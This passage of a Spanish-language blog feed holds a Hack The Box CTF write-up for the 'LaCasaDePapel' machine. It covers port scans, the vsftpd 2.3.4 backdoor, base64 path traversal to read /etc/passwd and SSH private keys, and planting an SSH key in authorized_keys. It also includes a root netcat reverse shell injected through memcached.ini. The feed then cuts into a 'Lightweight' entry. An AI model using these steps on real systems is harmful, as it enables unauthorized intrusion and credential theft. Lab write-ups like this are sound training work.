&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;masscan -p1-65535,U:1-65535 10.10.10.131 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 443/tcp on 10.10.10.131                                   
Discovered open port 22/tcp on 10.10.10.131                                    
Discovered open port 80/tcp on 10.10.10.131                                    
Discovered open port 21/tcp on 10.10.10.131
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Escaneo de puertos encontrados con MASSCAN.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-03 00:48 BST
Nmap scan report for 10.10.10.131
Host is up (0.22s latency).

PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js Express framework
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Agregamos lacasadepapel.htb a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
&lt;h1 id=&#34;https&#34;&gt;HTTPS&lt;/h1&gt;
&lt;p&gt;Al visitar la pagina en https nos muestra un error de certificado.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2018.01.04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
&lt;p&gt;Al visitar la pagina nos muestra una imagen QR.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-03-31%2023.41.33.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;ftp&#34;&gt;FTP&lt;/h1&gt;
&lt;p&gt;Encontramos ftp en su version &lt;code&gt;vftpd 2.3.4&lt;/code&gt; el cual tiene una vulnerabilidad de backdoor, utilizamos exploit escrito en python para ejecutar comandos, cuando lo ejecutamos nos muestra un mensaje de &lt;code&gt;Psy Shell&lt;/code&gt;, intentamos conectarnos al &lt;code&gt;puerto 6200&lt;/code&gt;, y encontramos una shell de Psysh,y con el comando dir la clase &lt;code&gt;$tokyo&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/&#34;&gt;&lt;em&gt;Expliting Vsftpd&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/In2econd/vsftpd-2.3.4-exploit&#34;&gt;&lt;em&gt;Github - Exploit&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-01%2016.32.38.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos el comando &amp;lsquo;show $tokyo&amp;rsquo; para mostrar el codigo que en este se encuentra.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-01%2016.37.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;class Tokyo {
	private function sign($caCert,$userCsr) {
    	$caKey = file_get_contents(&amp;#39;/home/nairobi/ca.key&amp;#39;);
    	$userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, [&amp;#39;digest_alg&amp;#39;=&amp;gt;&amp;#39;sha256&amp;#39;]);
    	openssl_x509_export($userCert, $userCertOut);
    	return $userCertOut;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al parecer es una clase que crea un certificado para tener acceso a la pagina en https, vamos a generar el nuestro utilizando la key (ca.key) que utiliza la funcion. Para leer este archiv utilizamos: &lt;code&gt;file_get_contents(archivo)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2020.06.40.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2020.06.57.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ibm.com/support/knowledgecenter/en/SSPH29_9.0.1/com.ibm.help.common.infocenter.aps/t_ConvertthepfxCertificatetopemFormat068.html&#34;&gt;&lt;em&gt;IBM - Certificate&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gist.github.com/Soarez/9688998&#34;&gt;&lt;em&gt;Github - Certificate&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://tecadmin.net/simple-steps-to-generate-csr-on-centos/&#34;&gt;&lt;em&gt;tecadmin - Certificate&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Generamos nuestro certificado para firefox con los siguientes comandos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;openssl req -key ca.key -new -x509 -days &lt;span class=&#34;m&#34;&gt;365&lt;/span&gt; -out lacasadepapelhtb.crt -subj &lt;span class=&#34;s2&#34;&gt;&amp;#34;/C=US/ST=New York/L=Brooklyn/O= La Casa De Papel/CN=lacasadepapel.htb&amp;#34;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;openssl pkcs12 -export -in lacasadepapelhtb.crt -inkey ca.key -out lacasadepapelhtb.p12
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Importamos nuestro certificado a firefox y al visitar la pagina nos muestra lo siguiente:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2020.02.03.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al visitar SEASON-1 nos muestra una lista de videos en formato avi al visitar o dar click a uno de ellos nos descarga un archivo, vacio.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2001.57.54.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;01.avi&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://lacasadepapel.htb/file/U0VBU09OLTEvMDEuYXZp
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Dicha url en su parte final (&lt;code&gt;/U0VBU09OLTEvMDEuYXZp&lt;/code&gt;) esta codificada en &lt;code&gt;base64&lt;/code&gt;, por lo que al decodificarla obtenemos el valor de &lt;code&gt;SESEASON-1/01.avi&lt;/code&gt;, sabiendo esto podemos codificar &lt;code&gt;../../../../etc/passwd&lt;/code&gt; en base64 para observar que pasa si codificamos una ruta de un archivo para descargarla.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2002.10.15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Asi es como obtenemos el archivo &lt;code&gt;/etc/passwd&lt;/code&gt;, ahora que sabemos como descargar archivos vamos a descargar el &lt;code&gt;id_rsa&lt;/code&gt; (&lt;code&gt;../.ssh/id_rsa&lt;/code&gt;) del usuario &lt;code&gt;berlin&lt;/code&gt; y asi conectarnos mediante el servicio ssh.&lt;/p&gt;
&lt;p&gt;Por alguna razon el &lt;code&gt;id_rsa&lt;/code&gt; del usuario &lt;code&gt;berlin&lt;/code&gt; no funciona en si mismo, funciona con el usuario &lt;code&gt;professor&lt;/code&gt; y &lt;code&gt;dali&lt;/code&gt;. En el caso de dali debemos de agregar nuestra clave al archivo &lt;code&gt;authorized_keys&lt;/code&gt; mediante &lt;code&gt;PSYSH&lt;/code&gt;.&lt;/p&gt;
&lt;h1 id=&#34;usuario-dali-psysh&#34;&gt;USUARIO DALI PSYSH&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://www.sitepoint.com/interactive-php-debugging-psysh/&#34;&gt;&lt;em&gt;Debugging Psysh&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Utilizando psysh en el puerto 6200 mediante telnet podemos leer y escribir archivos, en este caso vamos a leer el archivo /etc/passwd.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$file = file_get_contents(&#39;/etc/passwd&#39;);echo $file;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2023.16.25.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al revisar dicho archivo vemos que el usuario &lt;code&gt;dali&lt;/code&gt; tiene como shell psysh y su directorio principal es /home/dali.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/&#34;&gt;&lt;em&gt;etcpasswd format&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2023.17.45.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ya que sabemos que psysh es ejecutado por el usuario dali y tenemos acceso a su directorio principal, podemos generar y agregar nuestra &lt;code&gt;id_rsa.pub&lt;/code&gt; a el archivo &lt;code&gt;authorized_keys&lt;/code&gt; del usuario &lt;code&gt;dali&lt;/code&gt;, para luego poder conectarnos por medio de ssh.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2023.29.16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;$text = &amp;#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkleT1qRUUh9Qu7dT4UXLIfsQc4qkEvKax/+7T3l24zhIJm3R2KOEbfOYdtRBwVOyoE8YfXp7YjPV/lFa7W5MkOoXACk3bl1rYS8GrRr/uYMabrponpZTFPMRl90lBArarRPMFtEKtrhoTw+QBSdKa8Be5AOCp5I+Ky8hF/Pf7uSgThtYD7/LLFIpW6YJJu06M890xah1TwuXkgqzPfPWtaVOYvS1smnSYbjflNtMQ0pHSHBTElXx9r9VmFXIslBkST1iHbQT5ZzWHvKxFQkAEoLyAqdvIkgJ7zKbcEwz9bQO4dPVe18D4srDGUnoG+v+/YNexvwmHaCP/V5cUdupv root@sckull&amp;#34;;$filename = &amp;#34;/home/dali/.ssh/authorized_keys&amp;#34;;$fh = fopen($filename, &amp;#34;a&amp;#34;);fwrite($fh, $text);fclose($fh);
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Escribimos y verificamos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-02%2023.31.07.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora nos conectamos con la clave de &amp;lsquo;berlin&amp;rsquo;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2022.27.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;usuario-professor---ssh&#34;&gt;USUARIO PROFESSOR - SSH&lt;/h1&gt;
&lt;p&gt;Para el usuario professor utilizamos la misma clave para conectarnos y obtenemos una sesion ssh.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2022.29.01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---flag&#34;&gt;USER - FLAG&lt;/h2&gt;
&lt;p&gt;Al enumerar las carpetas de los usuarios encontramos nuestra bandera &lt;code&gt;user.txt&lt;/code&gt; en la carpeta de berlin, para obtenernuestra bandera encodeamos la direccion en base64 y la descargamos de la misma forma que la clave de berlin.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2022.38.06.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
&lt;p&gt;Utilizamos pspy64 para ver los crons que se ejecutan.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2022.52.46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos un proceso que se ejecuta que utiliza node y un archivo &lt;code&gt;memcached.js&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2023.00.11.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;El archivo memcached.js se encuentra en nuestra carpeta principal (&lt;code&gt;/home/professor&lt;/code&gt;) pero no tenemos permisos, tambien se encuentra otro archivo llamadao &lt;code&gt;memcached.ini&lt;/code&gt; que contiene un comando que ejecuta node con el archivo &lt;code&gt;memcached.js&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2023.03.54.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Hacemos una prueba de ping con el usuario root a nuestra ip, agregamos lo siguiente a memcached.ini, pero primero renombramos el archivo anterior a otro ya que no tenemos permisos, creamos un nuevo archivo con el mismo nombre y agregamos lo siguiente.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2023.45.36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y obtenemos la respuesta de la maquina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2023.44.24.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para obtener una shell inversa creamos un archivo con nuestra shell inversa dentro, y agregamos su ejecucion dentro del archivo &lt;code&gt;memcached.ini&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;batman.sh&lt;/em&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.12.119 7878 &amp;gt;/tmp/f&amp;#34;&lt;/span&gt; &amp;gt; /tmp/batman.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;memcached.ini
[program:memcached]
command = sudo -u root sh /tmp/batman.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2023.50.49.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/Screenshot%20from%202019-04-03%2023.49.17.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/lacasadepapel/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/lacasadepapel/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>ftp</category>
            
          
            
              <category>openssl</category>
            
          
            
              <category>cron</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Lightweight</title>
        <link>https://sckull.github.io/posts/lightweight/</link>
        <pubDate>Thu, 09 May 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 09 May 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/lightweight/</guid>
        <description>Lightweight es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Lightweight es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/light/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/166&#34;&gt;Lightweight&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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